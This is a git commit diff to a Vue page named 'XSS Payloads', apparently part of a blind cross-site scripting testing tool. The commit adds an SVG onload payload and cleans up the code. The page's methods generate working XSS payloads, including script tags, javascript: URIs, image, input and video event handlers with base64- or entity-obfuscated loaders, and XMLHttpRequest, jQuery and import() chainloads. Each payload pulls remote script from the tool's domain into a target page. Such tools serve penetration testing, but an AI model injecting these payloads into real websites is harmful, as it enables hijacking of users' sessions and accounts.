7fa5a702b0b5dc7149d44d8c1953d58e057c7537
Alexandre Fernandes <alexandretnparaujo@gmail.com>
2025-08-01 17:58:06 +0200

    adding svg payload.2

--- front-end/src/pages/XSSPayloads.vue
+++ front-end/src/pages/XSSPayloads.vue
@@ -7,7 +7,7 @@
                         <div>
                             <h1><i class="fas fa-file-code"></i> XSS Payloads</h1>
                         </div>
-                        <card v-for="payload in payloads">
+                        <card v-for="payload in payloads" :key="payload.title">
                             <h4 class="card-title" v-html="payload.title"></h4>
                             <h6 class="card-subtitle mb-2 text-muted">{{payload.description}}</h6>
                             <p class="card-text">
@@ -21,109 +21,115 @@
         </div>
     </div>
 </template>
+
 <script>
 import config from '@/config';
 import Vue from "vue";
 import api_request from '@/libs/api.js';
 import router from "@/router/index";
 import utils from '@/libs/utils';
+
 const html_encode = utils.html_encode;
 const urlsafe_base64_encode = utils.urlsafe_base64_encode;
 
 export default {
     data() {
         return {
+            base_domain: '',
+
             payloads: [
                 {
-                    'func': this.basic_script,
-                    'title': 'Basic <code>&lt;script&gt;</code> Tag Payload',
-                    'description': 'Classic payload',
+                    func: this.basic_script,
+                    title: 'Basic <code>&lt;script&gt;</code> Tag Payload',
+                    description: 'Classic payload',
                 },
                 {
-                    'func': this.javascript_uri,
-                    'title': '<code>javascript:</code> URI Payload',
-                    'description': 'Link-based XSS',
+                    func: this.javascript_uri,
+                    title: '<code>javascript:</code> URI Payload',
+                    description: 'Link-based XSS',
                 },
                 {
-                    'func': this.input_onfocus,
-                    'title': '<code>&lt;input&gt;</code> Tag Payload',
-                    'description': 'HTML5 input-based payload',
+                    func: this.input_onfocus,
+                    title: '<code>&lt;input&gt;</code> Tag Payload',
+                    description: 'HTML5 input-based payload',
                 },
                 {
-                    'func': this.image_onerror,
-                    'title': '<code>&lt;img&gt;</code> Tag Payload',
-                    'description': 'Image-based payload',
+                    func: this.image_onerror,
+                    title: '<code>&lt;img&gt;</code> Tag Payload',
+                    description: 'Image-based payload',
                 },
                 {
-                    'func': this.video_source,
-                    'title': '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
-                    'description': 'Video-based payload',
+                    func: this.video_source,
+                    title: '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
+                    description: 'Video-based payload',
                 },
                 {
-                    'func': this.iframe_srcdoc,
-                    'title': '<code>&lt;iframe srcdoc=</code> Tag Payload',
-                    'description': 'iframe-based payload',
+                    func: this.iframe_srcdoc,
+                    title: '<code>&lt;iframe srcdoc=</code> Tag Payload',
+                    description: 'iframe-based payload',
                 },
                 {
-                    'func': this.xmlhttprequest_load,
-                    'title': 'XMLHttpRequest Payload',
-                    'description': 'Inline execution chainload payload',
+                    func: this.xmlhttprequest_load,
+                    title: 'XMLHttpRequest Payload',
+                    description: 'Inline execution chainload payload',
                 },
                 {
-                    'func': this.jquery_chainload,
-                    'title': '<code>$.getScript()</code> (jQuery) Payload',
-                    'description': 'Chainload payload for sites with jQuery',
+                    func: this.jquery_chainload,
+                    title: '<code>$.getScript()</code> (jQuery) Payload',
+                    description: 'Chainload payload for sites with jQuery',
+                },
+                {
+                    func: this.svg_onload,
+                    title: '<code>&lt;svg&gt;</code> Onload Payload',
+                    description: 'SVG element with onload triggering import',
                 },
             ],
-
-            base_domain: '',
-        }
+        };
     },
-    watch: {},
+
     methods: {
-        js_attrib: function() {
+        js_attrib() {
             return 'var a=document.createElement("script");a.src="https://' + this.base_domain + '";document.body.appendChild(a);';
         },
-        basic_script: function() {
+        basic_script() {
             return "\"><script src=\"https://" + this.base_domain + "\"><\/script>";
         },
-        javascript_uri: function() {
+        javascript_uri() {
             return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + this.base_domain + "\\';document.body.appendChild(a)')";
         },
-        input_onfocus: function() {
+        input_onfocus() {
             return "\"><input onfocus=eval(atob(this.id)) id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + " autofocus>";
         },
-        image_onerror: function() {
-            return "\"><img src=x id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + " onerror=eval(atob(this.id))>";;
+        image_onerror() {
+            return "\"><img src=x id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + " onerror=eval(atob(this.id))>";
         },
-        video_source: function() {
+        video_source() {
             return "\"><video><source onerror=eval(atob(this.id)) id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + ">";
         },
-        iframe_srcdoc: function() {
+        iframe_srcdoc() {
             return "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;" + this.base_domain + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">";
         },
-        xmlhttprequest_load: function() {
-            return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://' + this.base_domain + '");a.send();<\/script>'
+        xmlhttprequest_load() {
+            return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://' + this.base_domain + '");a.send();<\/script>';
         },
-        jquery_chainload: function() {
+        jquery_chainload() {
             return '<script>$.getScript("https://' + this.base_domain + '")<\/script>';
         },
-        svg_onload: function() {
+        svg_onload() {
             return '<svg/onload=import("https://' + this.base_domain + '")>';
         },
     },
-    computed: {},
-    components: {},
-    async mounted() {
-        // For debugging
-        window.app = this;
 
-        // Base domain
+    async mounted() {
+        // For debugging convenience
+        window.app = this;
+        
+        // Initialize base_domain
         this.base_domain = api_request.BASE_DOMAIN;
     },
-    beforeDestroy() {}
 };
 </script>
+
 <style>
 .control-label {
     color: #d3d3d7 !important;
